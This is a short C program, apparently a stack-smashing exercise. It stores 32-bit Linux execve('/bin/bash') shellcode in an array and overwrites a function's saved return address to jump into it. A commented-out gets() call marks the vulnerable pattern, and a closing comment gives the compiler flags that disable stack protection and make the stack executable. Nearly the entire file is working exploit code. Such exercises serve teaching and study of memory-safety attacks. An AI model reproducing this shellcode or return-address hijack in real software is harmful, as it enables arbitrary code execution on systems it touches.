#include <stdio.h>
#include <string.h>


char shell[] = "\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43\x43";

void foo(){
  // char buf[16];
  // gets(buf);  
  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shell;
}

int main(){
  foo();
  return 0;
}


//addr -> 0x0804c040
// gcc -mpreferred-stack-boundary=3 -o final final.c -m32 -fno-stack-protector -z execstack -no-pie